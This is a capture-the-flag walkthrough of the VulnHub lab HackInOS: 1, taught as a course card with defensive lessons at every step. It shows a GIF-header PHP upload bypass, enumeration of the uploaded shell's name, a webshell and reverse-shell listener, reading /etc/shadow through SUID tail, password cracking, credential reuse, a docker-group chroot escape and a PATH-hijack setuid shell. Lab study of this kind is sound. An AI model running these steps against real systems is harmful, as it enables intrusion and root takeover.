# Machine 13 — HackInOS: 1

> **Position:** 13 of 13 · the final box · **Band 3 — Easy** (global rank **040** of 708)
> **Full writeup:** [`labs/3-040-hackinos-1/README.md`](../../labs/3-040-hackinos-1/README.md)

| | |
| --- | --- |
| **Machine** | HackInOS: 1 |
| **Author** | Fatih Çelik |
| **Released** | 9 March 2019 |
| **Target OS** | Ubuntu — Apache on **:8000**, OpenSSH 7.6p1, a **Docker** container hosting the web app |
| **VulnHub** | [entry/hackinos-1,295](https://vulnhub.com/entry/hackinos-1,295/) |
| **Objective** | `/root/flag` on the **host** (the `flag.txt` inside the container is **fake**) |
| **Estimated time** | 6–9 hours |

---

## How to use this card

Same template: **A** (method + theory) · **B** (the machine) · **C** (every command, logically).
The new theory here: **non-standard ports**, **hard-coded `localhost`**, **reading the developer's source**, **predictable randomness**, **recognising a container**, **hunting credentials in config files and databases**, and the **`docker` group escape**. The arc of this box is a chain of five small wins — *upload → shell in a container → root in a container → a reused password on the host → host root* — and each link is a different lesson.

---

# Part A — The method (theory)

## A.1 Why the absence of port 80 is a **hint**, not a dead end

The site lives on **8000**. A default scan would find **only SSH** and you would conclude there is nothing to attack. **`-p-` is non-negotiable** — this machine exists to drill that in. Remind yourself why: moving a service off its default port is *obscurity*, not a control. An attacker enumerates all 65 535 TCP ports; only a lazy scanner (or a default-configured tool) stops at the "common" 1 000.

## A.2 The `/etc/hosts` trick — and why the site looks broken

The front page is a **WordPress** blog whose HTML hard-codes `http://localhost:8000` as its base URL. On **your** machine every image, stylesheet and form action therefore points at **your own** localhost — the page renders broken, and submitting the upload form POSTs to **your own** machine (a classic beginner trap: "I uploaded it and nothing happened"). **You cannot simply add `TARGET localhost`** because `127.0.0.1 localhost` already exists in `/etc/hosts` (overwriting it breaks your own tools). Two clean fixes, both worth knowing:

1. Give the target **another hostname** (e.g. `hackinos`) and browse `http://hackinos:8000`.
2. Or **drive the request yourself** with `curl`/Burp. In Burp this can even be automated: *Options → Match and Replace* → replace `http://localhost` with the target IP in the body.

*(The author says on the VulnHub page: "localhost is meant to be there!")*

## A.3 Reading the **developer's source**

After a successful upload the response contains an **HTML comment** linking to the author's **GitHub** (`fatihhcelik/Vulnerable-Machine---Hint`), where `upload.php` is public. **You are not guessing at the filter — you are reading it.** That is how real source-code-review assessments work, and it teaches you to **derive** the bypass from the code instead of spraying payloads.

Three bugs, one of which **alone** would have been enough:
- An **extension allow-list is declared but never used** (dead code = a finding).
- The content check inspects **only magic bytes** (`getimagesize()`/`finfo_file()`).
- The new name is **`md5($name . rand(1,100)) . "." . $ext`** — **your extension is kept**.

**The content is validated; the name is not.** That asymmetry is the vulnerability.

## A.4 Predictable randomness

`rand(1,100)` has only **100 possible values** — and **you chose the original name**. So the destination filename is **fully enumerable** and found in about a second. **`rand()` is not a CSPRNG** and was never meant for security; even `mt_rand()` is predictable (its internal state can be recovered from two consecutive outputs). Correct: `random_bytes()`/`random_int()` or UUIDv4 — but the real fix is **not to rely on filename secrecy** at all.

## A.5 Container root ≠ host root

A **container** is a sandbox built from an image; everything you do inside it **can be deleted** with `docker rm`. So **root inside the container is not root on the host** — a mental model many beginners get wrong exactly once, right here. The bridge to host root is the **`docker` group**: `/var/run/docker.sock` is a UNIX socket owned by `root:docker`, and group membership grants **access to the daemon's API**, which runs as **root**. **The `docker` group (like `lxd`, `libvirt`, `disk`) IS root.**

## A.6 Credentials live where developers leave them

Many real engagements are won not by exotic exploits but by **reading configuration files and application databases**: `wp-config.php`, `.env`, backup SQL dumps, forgotten source repos. Two habits follow. First, **every credential is a lead** — test where each one is *valid*, because a password that works inside a container often also works on the host (credential **reuse**). Second, a hash is only as strong as its algorithm: a **bare, unsalted MD5** in a database can be identified and cracked in seconds — or recognised on sight (one famous value, `e10adc3949ba59abbe56e057f20f883e`, is the MD5 of `123456`, known to every defender and every cracking database).

---

# Part B — The machine

## B.1 What you will learn

1. Notice a **non-standard web port** (8000) and why `-p-` was essential.
2. Apply the **`/etc/hosts` trick** (or Burp Match & Replace) for an app hard-coded to `localhost`.
3. **Read source code** to derive an upload bypass instead of guessing.
4. Understand what a **declared-but-unused allow-list** means in practice.
5. Defeat a **MIME magic-byte check** by prepending a real image header.
6. Reason about **predictable randomness** and enumerate only the real candidate space.
7. Use **`ffuf`** with a generated wordlist and `-mc 200` (and recognise the `wfuzz`/`dirb` equivalents).
8. **Recognise that you are inside a container** and adjust your goal.
9. Escalate via **SUID `tail`** to read `/etc/shadow`, and crack the root password offline with John.
10. Pivot through **`wp-config.php` → MySQL → `host_ssh_cred`** to recover the host credential, then escape via **`docker` group membership** (and know the `lxd` and PATH-hijack alternatives).

## B.2 The map

| Stage | Where |
| --- | --- |
| Non-standard web port, no 80 | **:8000** — WordPress, rendering broken (links hard-coded to `localhost`) |
| **Hard-coded `localhost`** | → the `/etc/hosts` trick, or Burp Match & Replace |
| `robots.txt` | disallows **`/upload.php`** and **`/uploads`** (`/uploads` itself → **403**, no indexing) |
| **Developer's source on GitHub** | HTML comment after a successful upload |
| **Allow-list declared but unused** | `$allowed_ext` never referenced |
| **MIME check inspects magic bytes only** | `getimagesize()`/`finfo_file()` → a GIF/PNG header defeats it |
| **Predictable "random" filename** | `md5($name . rand(1,100))` → **100 candidates** |
| Uploads inside the document root | `/var/www/html/uploads/` |
| **SUID `tail`** | `/usr/bin/tail` (in the container) → `/etc/shadow` |
| **Root's weak password** | `root:john` (cracked from the shadow hash) |
| Fake flag + hint file | `/root/flag.txt` ("not the end"), `/root/.port` ("look at other containers") |
| **Credential in the web app's database** | `wp-config.php` → MySQL → table `host_ssh_cred` → `hummingbirdscyber:123456` |
| **Credential reuse: container app → host SSH** | port 22 |
| **`docker` group = host root** | `999(docker)` |

## B.3 Before you start

- [02 — Web Attacks](../02-Web-Attacks.md) **§6** — the whole file-upload section and the bypass table.
- [06 — Shells, Persistence and Escapes](../06-Shells-Persistence-and-Escapes.md) **§5** — container detection and escapes.
- [05 — Linux Privilege Escalation](../05-Linux-Privilege-Escalation.md) **§2** (SUID) and **§8** (groups — `docker`, `lxd`).

**Answer before:**
1. Your scan shows 22 and 8000 but no 80. Why is that **not** a sign of a hardened box?
2. A form's `action` points at `http://localhost:8000/upload.php`. What happens when you submit it, and how do you fix it?
3. `finfo_file()` says `image/png`. What exactly did it check, and what did it **not** check?
4. `md5($name . rand(1, 100))` — how many possible filenames, given that you chose `$name`?
5. `id` says `uid=0(root)` and you still cannot read the flag. Why?

---

# Part C — The walkthrough, step by step

## Step 1 — Scan

**Theory:** your first job is *complete* service discovery. HackInOS punishes anyone who assumes "web = port 80", so sweep every port before drawing conclusions.

```bash
sudo nmap -A -p- -T4 -oN scans/hackinos.txt TARGET
```

`-A` = aggressive (OS + version detection, default scripts, traceroute); `-p-` = **all 65 535 TCP ports**, not just the default 1 000; `-T4` = faster timing (safe on a local lab); `-oN file` = save the normal-format output for your notes.

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: HackInOS
| http-robots.txt: 2 disallowed entries
|_/upload.php
|_/uploads
```

**How to read it.** **There is no port 80 — and that is the hint, not a dead end** (Part A.1): the site lives on **8000**, which is exactly why `-p-` was essential. The `http-robots.txt` lines are an NSE script reading `robots.txt` *for* you: the site itself asks crawlers to ignore `/upload.php` and `/uploads` — an **upload feature and its storage directory**, straight from the target's own mouth. Version strings are leads too: they tell you the Ubuntu era, and later the SUID hunt will confirm you are on a slim image.

🡒 **Defensive lesson:** `robots.txt` is public — never "hide" internal paths in it. Run `nmap -p-` against your own hosts: anything listening is discoverable.

## Step 2 — The broken WordPress site and the `/etc/hosts` trick

**Theory:** browse before you exploit. A site that renders *half* broken is telling you how it was deployed.

```bash
curl -s http://TARGET:8000/ | head -40
echo "TARGET hackinos" | sudo tee -a /etc/hosts
```

```text
<form action="http://localhost:8000/upload.php" method="post" enctype="multipart/form-data">
```

**How to read it.** The page is WordPress, and the developer **hard-coded** `localhost` as the base URL (the author admits it: "localhost is meant to be there!"). When your browser submits the form it POSTs to **your own** machine — hence "nothing happens". **You cannot add `TARGET localhost`** because `127.0.0.1 localhost` already exists. So: map a **new** hostname `hackinos` and use `http://hackinos:8000`, or bypass the browser and send the POST yourself with `curl -F` / Burp. Two micro-lessons in the setup command: **`sudo tee -a` rather than `sudo echo >>`** — the shell evaluates the redirect **before** `sudo` runs, so `sudo echo >>` writes with *your* privileges and fails; and appending keeps your existing `localhost` line intact.

**Beginner trap:** some people edit the `localhost` line itself to point at the target. It can work, but it breaks every local service that resolves `localhost` — you will spend an hour debugging tools that stopped working. Prefer a new alias.

🡒 **Defensive lesson:** build artifacts with **relative URLs** (or environment-driven base URLs). A dev-time `localhost` in production is a configuration-management failure, and hard-coded internal hostnames leak infrastructure names to anyone who views source.

## Step 3 — Content discovery: `robots.txt`, `upload.php`, `/uploads`

**Theory:** when NSE mentions `robots.txt`, read it manually — scripts summarise, they do not quote.

```bash
curl -s http://hackinos:8000/robots.txt
curl -s -o /dev/null -w '%{http_code}\n' http://hackinos:8000/uploads/
```

```text
User-agent: *
Disallow: /upload.php
Disallow: /uploads
403
```

**How to read it.** Two leads: **`upload.php`** (an upload form — the classic web-app foothold) and **`/uploads`** (where the files land). The **403 Forbidden** on `/uploads` means **directory indexing is off**: even after a successful upload you will not be able to *list* the folder to see your file's new name — that single fact turns Step 6 into a brute-force. (The 403 also confirms the directory exists, which is itself information.)

🡒 **Defensive lesson:** 403 on upload directories is correct; keep it. The real fix is in Part D — store uploads **outside** the web root and never execute them.

## Step 4 — Read the developer's source

**Theory:** you do not need the source to *try* an upload, but you need it to be **reliable**. Guessing filters means many failed attempts; reading one file means one correct attempt — and in a lab with a 5-minute cleanup cron (Step 6), speed matters.

Open `upload.php` in the browser, upload any accepted image (a normal PNG works), and an **HTML comment** in the response links to the author's **GitHub**, where the file is public. The decisive lines:

```php
$rand_number = rand(1,100);
$target_file = "uploads/" . md5(basename($_FILES["file"]["name"] . $rand_number));
$imageFileType = strtolower(pathinfo($file_name, PATHINFO_EXTENSION));
$check = getimagesize($_FILES["file"]["tmp_name"]);
if ($check["mime"] == "image/png" || $check["mime"] == "image/gif") { $uploadOk = 1; }
...
move_uploaded_file($_FILES["file"]["tmp_name"], $target_file . "." . $imageFileType);
```

**How to read it — this is the whole box, in a few lines** (Part A.3):
- The content check is **magic bytes only** (`getimagesize` inspects the file header) → you must send a **real image header**, not rename a `.php`.
- The destination name is **`md5(name . rand(1,100)) . "." . $ext`** — the **extension you uploaded is kept** (lower-cased), so `.php` survives, and only **100 candidate names** exist (Part A.4).
- **Content is validated; the name is not.** Asymmetry = vulnerability.

🡒 **Defensive lesson:** the code is on GitHub *and linked from the page* — never expose internal source. And note the dead allow-list: **declared-but-unused code is a finding**, because it proves the *intent* was never enforced.

## Step 5 — Build a polyglot and upload it

**Theory:** a **polyglot** is a file valid as two formats at once. Here we need PHP that *also* looks like a GIF to the six-byte magic signature `GIF87a`/`GIF89a`. `getimagesize()` only sniffs the header, so six correct bytes at the top satisfy it; the `.php` extension at the end makes Apache execute the body.

```bash
printf 'GIF87a' | cat - shell.php > cmd.php
file cmd.php
curl -s -F "file=@cmd.php" http://hackinos:8000/upload.php
curl -s -F "file=@note.txt" http://hackinos:8000/upload.php      # negative test
```

```text
cmd.php: GIF image data
File uploaded /uploads/?
:)                       (note.txt rejected)
```

**How to read it.** `printf 'GIF87a'` emits the six magic bytes; `cat - shell.php` concatenates your reverse-shell payload (e.g. the standard `php/reverse_shell` with your IP/port) after them — the `-` means "read stdin here". `file cmd.php` on *your* machine confirms the trick locally before you even upload. `curl -F "file=@cmd.php"` performs the `multipart/form-data` POST the form would have sent. The server answers `File uploaded /uploads/?` — accepted, but **the name is now an MD5 hash**. `GIF89a` works equally well; several writeups use it.

**The rejected `note.txt` is the most important line:** it proves the MIME check **is live** — so your success came from the image header, not from a filter that does nothing. **Always run the negative case**; otherwise you cannot distinguish "bypassed the check" from "there was no check".

🡒 **Defensive lesson:** magic bytes are trivially forged. Real defence: a strict server-side extension allow-list **and re-encoding the image** through an image library (which destroys any embedded payload), stored outside the web root with execution disabled.

## Step 6 — Find the randomised filename

**Theory:** you did not break the randomness — you **enumerated its tiny space** (Part A.4). 100 candidates, each an MD5 of a string *you* control, so you can pre-compute the entire list and point a content-discovery tool at it.

```bash
python3 -c "import hashlib
for i in range(1,101): print(hashlib.md5(('cmd.php'+str(i)).encode()).hexdigest()+'.php')" > names.txt
ffuf -u http://hackinos:8000/uploads/FUZZ -w names.txt -mc 200 -fs 0
```

```text
9f2c1e7a4b8d5f6a0e3c2b1d4f5a6b7c.php [Status: 200, Size: 1284]
```

**How to read it.** The Python one-liner mirrors the PHP exactly — `md5("cmd.php" . N)` for N in 1..100 — and appends `.php` because the server keeps the extension. `ffuf` substitutes **`FUZZ`** with each word from `-w`; **`-mc 200`** keeps only HTTP 200 responses; **`-fs 0`** filters out zero-size bodies (adapt the number to whatever your "not found" page returns — the point is to silence the misses). If ffuf finds **nothing**, your hash input string is wrong — check case (the extension is lower-cased) and whether `.php` went inside or outside the hash.

**Tool-equivalence:** writeups solve the same step with `wfuzz -w names.txt --hc 404 .../uploads/FUZZ.php`, with `dirb .../uploads/ dict.txt`, or with a small PHP/Python loop that tests each URL and prints the 200. Same idea, different tool. **Speed matters:** one writeup reports a cron job on some revisions that deletes `*.php` from `uploads/` **every 5 minutes** — so automate upload + brute-force as one loop, or your shell may be gone before you trigger it.

🡒 **Defensive lesson:** "the filename is a secret" is not access control. Random names only slow enumeration; they never replace authentication on upload handlers.

## Step 7 — Execute: remote code execution, then "…this is a container"

**Theory:** the uploaded file is now PHP **on the server**. Use a one-shot webshell (`?cmd=id`) to test, then a **reverse shell** for a real session — and start your listener **first**, or the connection never lands.

```bash
nc -lvnp 4444                                  # Kali, first
curl -s "http://hackinos:8000/uploads/<MD5>.php?cmd=id"
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Ncat: Connection from 192.168.56.101.
www-data@0d8f1c2b3a4e:/var/www/html$ hostname
0d8f1c2b3a4e
```

`nc -lvnp 4444`: **l**isten, **v**erbose, **n**umeric (no DNS), **p**ort 4444. When the shell arrives, upgrade it to an interactive TTY — without this, `su`, `vi` and job control misbehave:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'   # (or python -c … on older images)
```

**How to read it — the eureka moment.** The prompt's hostname is `0d8f1c2b3a4e`: **12 hex characters, a container ID, not a machine name.** Confirm before assuming:

```bash
ls -la /.dockerenv; cat /proc/1/cgroup | head
```

```text
-rw-r--r-- 1 root root 0 /.dockerenv
1:memory:/docker/0d8f1c2b3a4e2f...
```

`/.dockerenv` is the marker file Docker drops at `/` in every container; `/proc/1/cgroup` shows PID 1 inside a `/docker/<id>` cgroup (on a real host, PID 1 is `systemd`/`init`). **You are inside a container** — your goal changes: root *here* is a milestone, not the finish line.

🡒 **Defensive lesson:** RCE behind an upload form is game over for that server. Defence is prevention (Step 5's fixes) plus detection: alert on PHP files appearing in upload directories.

## Step 8 — Inside the container: SUID `tail`

**Theory:** a **SUID** binary runs with the **file owner's** privileges, not yours — the `s` in `rwsr-xr-x`. Legitimate for `sudo`/`passwd`; dangerous when someone runs `chmod u+s` on the wrong tool. **`tail` only reads files** — but running as root it can read **any** file, including `/etc/shadow`. This is why the SUID hunt opens every Linux privesc: `find / -perm -4000 -type f 2>/dev/null`.

```bash
sudo -l
find / -perm -u=s -type f 2>/dev/null
ls -l /usr/bin/tail
```

```text
/usr/bin/tail
-rwsr-xr-x 1 root root 31408 May 28  2020 /usr/bin/tail
```

**How to read it.** No `sudo` binary (typical of a slim image — the container was minimised, good hygiene that did not help here). The SUID search found **`/usr/bin/tail`**, which is **not** stock: a default Ubuntu image never sets setuid on `tail`. Somebody ran `chmod u+s`. In the GTFOBins mindset: *which primitives does this root-owned binary give me?* For `tail`, the answer is "read anything".

🡒 **Defensive lesson:** audit SUID/SGID bits in **every** image and host (`find / -perm -u=s`) and compare against an expected list. Containers need even fewer of them than hosts.

## Step 9 — Read `/etc/shadow` and crack it offline

**Theory:** `/etc/shadow` stores one line per user: `name:hash:…`; you only need the first two fields. `tail` without options prints the **last 10 lines**, so two flags fix that: `-n +2` starts at line 2 (everything onwards), while `-c1G` (used in most writeups) dumps up to 1 GB of *bytes* — i.e. the whole file. Either works.

```bash
/usr/bin/tail -n +2 /etc/shadow
```

```text
root:$6$qoj6/JJi$FQe/BZlfZV9VX8m0i25Suih5vi1S//OVNpd.PvEVYcL1bWSrF3XTVTF91n60yUuUMUcP65EgT8HfjLyjGHova/:17951:0:99999:7:::
```

**How to read it.** The field between the first two colons is the hash, and its **prefix names the algorithm**: `$6$` = SHA-512-crypt, `$5$` = SHA-256-crypt, `$1$` = MD5-crypt, `$y$` = yescrypt. ⚠️ **Verification note:** different copies of this image have shipped with different formats — one writeup's screenshot shows the `$6$` hash above; others show a weaker `$1$` (MD5-crypt) variant. It does not change the outcome: `root`'s password is a dictionary word, so John cracks it either way. **Do not force `--format`** — let John auto-detect, or pick the format you actually observed.

```bash
echo 'root:$6$qoj6/JJi$FQe/BZlfZV9VX8m0i25Suih5vi1S//OVNpd.PvEVYcL1bWSrF3XTVTF91n60yUuUMUcP65EgT8HfjLyjGHova' > hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt
```

```text
Loaded 1 password hash (sha512crypt, crypt(3) $6$ ...)
root             (root)
```

**How to read it.** You copy only `user:hash` — the trailing ageing fields are irrelevant. `Loaded 1 password hash` confirms John parsed the input and recognised the format. **(The password is `john`.)** One writeup runs `unshadow passwd.txt shadow.txt` first to pair `/etc/passwd` names with shadow hashes — useful for bulk cracking, optional for a single root line. Format names you may meet: `sha512crypt`, `md5crypt`, and `raw-md5` (for **unsalted** MD5 — you need that one in Step 11).

🡒 **Defensive lesson:** `$6$` with a strong password is acceptable; with `john` it is paper. Modern Ubuntu uses **yescrypt (`$y$`)** — and a password policy plus breached-password checks beats any hash upgrade on its own.

## Step 10 — Container root — and the fake flag

```bash
su root                 # password: john
cat /root/flag.txt
ls -la /root/.port; cat /root/.port
```

```text
Congratulations! You are root... but this is not the end.
Life consists of details..
Listen to your friends..
7*
```

**How to read it.** You are root — **of the container**. Everything so far happened in a sandbox that `docker rm` can delete. The author trolls you with a fake flag, and the `.port` file is a deliberate hint: *listen* to your friends (the other containers on the Docker network) — the game continues **outside** this box. Two habits converge here: when a "prize" looks wrong, distrust it; when you hold root but not the flag, **re-enumerate** — you are probably one layer too shallow.

🡒 **Defensive lesson:** a compromised container is a beachhead, not a curiosity. Segment the container network and treat inter-service credentials (next step) as production secrets.

## Step 11 — The pivot: `wp-config.php` → MySQL → `host_ssh_cred`

**Theory:** re-enumeration means reading **configuration** (Part A.6). WordPress stores its database credentials in `/var/www/html/wp-config.php` — and in Docker Compose the hostname `db` in that file is a **service name**, resolved by Docker's internal DNS to another container on a private bridge network. That is the "friend" `.port` told you to listen to.

```bash
grep -E 'DB_(NAME|USER|PASSWORD|HOST)' /var/www/html/wp-config.php
ping -c1 db
```

```text
define('DB_NAME', 'wordpress');
define('DB_USER', 'wordpress');
define('DB_PASSWORD', 'wordpress');
define('DB_HOST', 'db:3306');
PING db (172.18.0.3) 56(84) bytes of data.
```

**How to read it.** The app's own database password is `wordpress` — and `db` **resolves**, so the database container is reachable *from here*. (The exact address varies by revision: writeups show `172.18.0.2` or `172.18.0.3`; trusting the name `db` beats hard-coding the IP. One writeup maps the whole `172.18.0.0/16` network from the shell with Metasploit's `autoroute` + `ping_sweep` + `portscan` modules and finds MySQL that way — same destination, bigger hammer.)

```bash
mysql -h db -u wordpress -p wordpress
```
```sql
SHOW TABLES;
SELECT * FROM host_ssh_cred;
```

```text
| host_ssh_cred           |
hummingbirdscyber:e10adc3949ba59abbe56e057f20f883e
```

**How to read it.** `host_ssh_cred` is **not** a WordPress table — nobody legitimate stores an SSH-credential table in a blog database, so the name itself is the flag. The value after the colon is a **bare, unsalted MD5** (no `$1$`/`$6$` wrapper — that is how you know it is raw MD5, not crypt). Crack it:

```bash
echo 'hummingbirdscyber:e10adc3949ba59abbe56e057f20f883e' > sshcreds.txt
john --format=raw-md5 sshcreds.txt
```

```text
123456           (hummingbirdscyber)
```

**How to read it.** `--format=raw-md5` because there is no salt and no crypt wrapper. `123456` is instantly recognisable: `e10adc3949ba59abbe56e057f20f883e` is one of the most famous hashes in existence (one writeup simply looked it up online). We now hold **`hummingbirdscyber:123456`** — and the map says this credential is *reused* somewhere. Where? The only service untouched since Step 1: **SSH on port 22 of the host**.

⚠️ **Verification note (important):** this credential comes from the **web application's database** — the WordPress/MySQL instance behind `db` — **not** from `/etc/shadow`. The SUID-`tail` read in Step 9 yields the **root** hash only; do not go back to your shadow output looking for `hummingbirdscyber`.

🡒 **Defensive lesson:** secrets in code and databases are the #1 credential leak. Bake no passwords into images; inject secrets at runtime; give every service a unique password. And storing a raw MD5 of a password *is* storing the password — use a slow KDF (argon2/bcrypt/yescrypt) even for "internal" tables.

## Step 12 — SSH to the host, and the `docker`-group escape

```bash
ssh hummingbirdscyber@TARGET        # password: 123456
id
```

```text
uid=1000(hummingbirdscyber) gid=1000(hummingbirdscyber) groups=...,999(docker)
```

**How to read it.** The **same password worked on a different service of a different machine** — credential reuse, the whole reason Step 11 mattered. `hostname` is now **`hackinos`**, not a 12-hex container ID: you are on the **host**. And **`999(docker)`** in `id` is the entire escalation. Read the next two outputs **together** — this pair *is* the exploit:

```bash
ls -l /var/run/docker.sock
getent group docker
```

```text
srw-rw---- 1 root docker 0 /var/run/docker.sock
docker:x:999:hummingbirdscyber
```

`/var/run/docker.sock` is a UNIX socket (the `s` in `srw-rw----`), mode `srw-rw----`, owner **`root:docker`**. `getent group docker` confirms **your user is in that group**. Membership grants access to the **Docker daemon's API** — and the daemon runs as **root** (Part A.5). **The `docker` group IS root**: you can start containers, and containers can mount host directories. So:

```bash
docker run -v /:/host --rm -it alpine chroot /host sh
id
cat /root/flag
```

| Token | Meaning |
| --- | --- |
| `docker run` | create and start a new container |
| `-v /:/host` | **bind-mount the host's `/` at `/host`** — **this** is the exploit |
| `--rm` | delete the container on exit (less forensic residue) |
| `-it` | interactive with a TTY |
| `alpine` | a 5 MB image, so nothing to download |
| `chroot /host sh` | change the process's root to the mounted host filesystem, then run a shell |

**`chroot /host` is the step people forget:** without it you have a shell *inside* a container that can *see* the host's files at `/host`, but your `/etc/passwd` and `/root` are still the container's. After `chroot`, the shell's `/` **is** the host's `/`, and `/root/flag` is the real one. Variants seen in writeups: `docker run -v /:/root -i -t ubuntu /bin/bash` then `cat /root/root/flag` (host root mounted at `/root`, so the real `/root` is `/root/root` — confusing on purpose); or dropping a **setuid shell** instead of staying attached:

```bash
docker run --rm -v /home/$USER:/h_docs ubuntu sh -c 'cp /bin/sh /h_docs/ && chmod +s /h_docs/sh' && ~/sh -p
```

Copy a shell into a directory you mounted from the host, `chmod +s` it **from inside** the privileged daemon context, then run it on the host with **`-p`** — mandatory, because bash/sh drop their effective UID on SUID shells without it (same rule as Step 13). GTFOBins lists this whole family under [`docker`](https://gtfobins.github.io/gtfobins/docker/).

🡒 **Defensive lesson:** membership of `docker`, `lxd` or `disk` is **root-equivalent** — audit it like root (`getent group docker`). Remove humans from the group, or run rootless Docker/Podman where the daemon has no root to lend.

## Step 13 — Alternative on the host: PATH hijacking against the SUID helper

**Theory:** the host also ships a second, sillier privesc. If a **SUID-root** program calls another program **by bare name** (e.g. `whoami`), Linux finds it via **`$PATH`** — and if a directory **you own** leads `PATH`, you decide *which* `whoami` runs, as root.

```bash
find ~ -perm -u=s -type f 2>/dev/null
file a.out; strings a.out | grep -i whoami
echo $PATH
```

```text
/home/hummingbirdscyber/bin:/usr/local/sbin:/usr/local/bin:...
```

**How to read it.** An SUID-root binary **`a.out`** sits in the user's home directory (on the Desktop in one writeup's screenshots) — "they could not be any more obvious". `file` says it is a setuid ELF; `strings` reveals it shells out to **`whoami`**; running it prints `root` and exits. The trap is in `$PATH`: **`/home/hummingbirdscyber/bin` comes first**, and you own (can create) it. Classic **PATH hijack**:

```bash
mkdir -p ~/bin
printf '#!/bin/sh\ncp /bin/bash /tmp/rb\nchmod 4755 /tmp/rb\n' > ~/bin/whoami
chmod +x ~/bin/whoami
./a.out                    # SUID-root helper now runs YOUR ~/bin/whoami as root
/tmp/rb -p                 # SUID bash; -p keeps euid=0
id                         # uid=0(root) — on the HOST, no Docker involved
```

One writeup's minimal payload (a `whoami` file containing just `/bin/bash`) also works; the version above is the robust pattern you will reuse elsewhere — **`-p` is mandatory** either way, because bash/sh drop their effective UID on a SUID shell without it.

🡒 **Defensive lesson:** privileged programs must call helpers with **absolute paths** (`/usr/bin/whoami`), and no user-writable directory may ever lead a root process's `PATH`. This bug class regularly appears in real software (and in `sudo`/`pkexec` history).

---

# Part D — Defensive lessons

| Finding | Fix |
| --- | --- |
| Web app on :8000, no :80 | Port choice is not a control. Authenticate, firewall, monitor every listener |
| **Hard-coded `localhost` in the form action / WP base URL** | Use relative URLs. A dev-time base URL in production is a configuration-management failure |
| **Vulnerable source on GitHub, linked from the page** | Never link internal repositories from served pages |
| `$allowed_ext` declared but unused | **Dead code is a finding.** Add a test that uploads `.php` and asserts rejection |
| MIME check via `getimagesize()`/`finfo_file()` only | Magic bytes are trivially forged. Server-side extension allow-list, and **re-encode** the image |
| `md5($name . rand(1,100))` | Use `random_bytes()`/`random_int()` — but the real fix is not to rely on filename secrecy |
| Uploads in `/var/www/html/uploads/` | Store outside the web root; `Content-Disposition: attachment`; `php_admin_flag engine off` |
| **SUID `/usr/bin/tail`** | `chmod u-s`. Audit SUID in **every** image, including containers |
| Weak/legacy password hashes (`$6$`/`$1$`) cracked to `john` | Use yescrypt/argon2; enforce a password policy; check breached-password lists |
| **DB password in `wp-config.php`, identical for every image build** | No baked-in secrets; runtime secret injection; rotate per deployment |
| **Unsalted MD5 of a password in `host_ssh_cred`** | A fast hash of a password *is* the password — use a slow KDF even for internal tables |
| **Container password reused for host SSH** | Unique credentials per system. One reuse turned a container compromise into a host compromise |
| **Host user in the `docker` group** | Remove the membership, or use rootless Docker/Podman. `docker` is root-equivalent |
| SUID binary calling `whoami` via `$PATH` | Absolute paths in privileged programs; never let a user-writable directory appear first in `PATH` |

**The single biggest lesson:** *container root is not host root, and group membership is the bridge.*
Nothing here was a software vulnerability in Docker — the escape was a **misconfiguration**.

---

# Part E — Review questions

1. Why was the missing port 80 a **hint** rather than a dead end?
2. Explain the `/etc/hosts` problem precisely: why can't you just add `TARGET localhost`?
3. Name the three distinct bugs in `upload.php`, and say which one alone would have been enough.
4. `rand(1, 100)` is not cryptographically secure. Would `random_int()` have fixed it? What **would**?
5. Why did prepending a GIF header satisfy `getimagesize()` while PHP still executed the file?
6. What told you that you were inside a container, and how did your objective change at that moment?
7. SUID `tail` gave you `/etc/shadow` but not the flag. Explain the two-step reasoning that turned a *read* into a *login*, and where the second credential actually came from.
8. `docker` group membership is root. Explain the mechanism, and name the audit question a defender should ask.
9. The container had no `gcc` and no `nc`. Did that make it secure? What did it actually change?

---

# Part F — Hints ladder

<details>
<summary><strong>Rung 1 — a nudge</strong></summary>

`sudo nmap -sC -sV -p- TARGET` → **22** and **8000**. Browse to `:8000` — the page renders broken and there is an upload form. Try to submit it: "nothing happens". Look at the **`action`** in the page source. *(The author: "localhost is meant to be there!")* Fix the hostname, upload something, and **view source again**.
</details>

<details>
<summary><strong>Rung 2 — read the source</strong></summary>

Give the target a hostname `hackinos` in `/etc/hosts` and drive the POST with `curl`/Burp. Follow the comment to **GitHub**. Three lines matter: allow-list declared but unused; `getimagesize()` checks **magic bytes only**; `$newname = md5($name . rand(1,100)) . "." . $ext` — **your extension is kept**. Upload `cmd.php` with a **PNG/GIF** header — and try a `.txt` first to prove the check is live.
</details>

<details>
<summary><strong>Rung 3 — find the name</strong></summary>

`md5("cmd.php" . N) . ".php"` for N in **1..100** → 100 candidates.
`ffuf -u http://hackinos:8000/uploads/FUZZ -w candidates.txt -mc 200`. If it finds nothing, the string you hashed does not match — check whether the extension is included and lower-cased. Watch out: some revisions delete `*.php` from `uploads/` every 5 minutes — automate.
</details>

<details>
<summary><strong>Rung 4 — container, then pivot</strong></summary>

`ls -la /.dockerenv`, `cat /proc/1/cgroup`, `hostname` (12-hex). `find / -perm -4000` → **SUID `/usr/bin/tail`** → `tail -n +2 /etc/shadow` → John → `root:john` → `su root` (container root, fake flag). The fake flag is a hint: `cat /root/.port`, then `grep DB_ /var/www/html/wp-config.php` → `mysql -h db -u wordpress -p` → table **`host_ssh_cred`** → unsalted MD5 → `john --format=raw-md5` → `hummingbirdscyber:123456`.
</details>

<details>
<summary><strong>Rung 5 — the answer</strong></summary>

1. `nmap -p-` → **22, 8000** (no 80). 2. Form `action=http://localhost:8000/upload.php` → hostname `hackinos`.
3. HTML comment → GitHub `upload.php`: allow-list unused; magic-byte check; `md5(name.rand(1,100)).ext`.
4. `cmd.php` + GIF header → `/uploads/` (403, no listing). 5. 100 candidates → `ffuf` → **RCE** `www-data`.
6. `/.dockerenv` → container; SUID `tail` → `/etc/shadow` → John → `su root` (container, fake flag).
7. `.port` → `wp-config.php` → `mysql -h db` → `host_ssh_cred` → raw MD5 → `123456`.
8. `ssh hummingbirdscyber@TARGET` → **`999(docker)`**. 9. `docker run -v /:/host … chroot /host sh` → host root → `/root/flag`. *(Or the SUID `a.out` PATH hijack.)*
</details>

---

# Part G — References

- **VulnHub entry:** <https://vulnhub.com/entry/hackinos-1,295/>
